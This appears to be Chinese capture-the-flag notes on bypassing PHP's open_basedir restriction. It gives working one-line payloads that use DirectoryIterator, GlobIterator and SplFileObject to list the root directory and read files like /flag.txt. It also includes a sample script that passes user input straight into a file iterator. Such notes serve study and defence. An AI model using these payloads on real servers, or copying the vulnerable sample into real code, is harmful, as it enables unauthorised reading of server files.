###### <font style="color:rgb(79, 79, 79);">open_basedir简介</font>
Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。

###### <font style="color:rgb(79, 79, 79);">利用DirectoryIterator + Glob 直接列举目录</font>
题目中用的就是这种方法

再举个别的例子

代码如下

```php
<?php
$dir = $_GET['7'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f.'<br>');
?>
# payload一句话的形式:
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f.'<br>');}
```

<font style="color:rgb(77, 77, 77);">利用payload</font>

```php
/?7=glob:///*      #列出根目录下所有文件
```

###### <font style="color:rgb(79, 79, 79);">FilesystemIterator</font>
<font style="color:rgb(77, 77, 77);">与上面基本一致，不再过多讨论</font>

###### <font style="color:rgb(79, 79, 79);">GlobIterator</font>
**<font style="color:rgb(77, 77, 77);">根据该类特点，</font>**<font style="color:rgb(77, 77, 77);"> 不用在配合glob://协议</font>

<font style="color:rgb(77, 77, 77);">一句话payload</font>

```php
$a = new GlobIterator("/*");foreach($a as $f){echo($f.'<br>');}
```

#### <font style="color:rgb(79, 79, 79);">可读取文件类</font>
##### <font style="color:rgb(79, 79, 79);">SplFileObject 类</font>
<font style="color:rgb(77, 77, 77);">SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</font>

**<font style="color:rgb(77, 77, 77);">原理</font>**

<font style="color:rgb(77, 77, 77);">该类的构造方法可以构造一个新的文件对象用于后续的读取。其大致原理可简单解释一下，当类中</font><font style="color:#601BDE;">__tostring</font><font style="color:rgb(77, 77, 77);">魔术方法被触发时，如果类中内容为存在文件名，那么它会对此文件名进行内容获取。</font>

```php
<?php
$dir=new SplFileObject("/flag.txt");
echo $dir;
?>
```

<font style="color:rgb(77, 77, 77);">这样只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历</font>

```php
<?php
    $dir = new SplFileObject("/flag.txt");
    foreach($dir as $tmp){
        echo ($tmp.'<br>');
    }
?>
```

